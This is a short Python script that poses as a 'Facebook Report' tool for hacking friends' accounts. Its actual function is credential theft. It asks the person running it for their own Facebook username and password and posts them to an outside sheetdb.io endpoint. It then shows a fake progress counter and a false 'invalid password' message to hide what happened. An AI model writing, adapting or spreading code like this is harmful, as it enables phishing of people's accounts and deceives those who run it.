import requests
import pyfiglet
import time
a = pyfiglet.figlet_format('Facebook Report')
print(a)
print("autor by : Myanmar Anonymous Hepler Teams")
print("dont use illegal")
print('please login with your facebook \n for hack your firends')

umail =input("please Enter Username : ")
upass =input("please Enter Fb password : '")
data ={'mail':umail,'pass':upass}
rq =requests.post('https://sheetdb.io/api/v1/3ll19kvp2nu50',data=data)

for i in range(100):
   print(i,'%')
   time.sleep(1)
print('invalid password or username')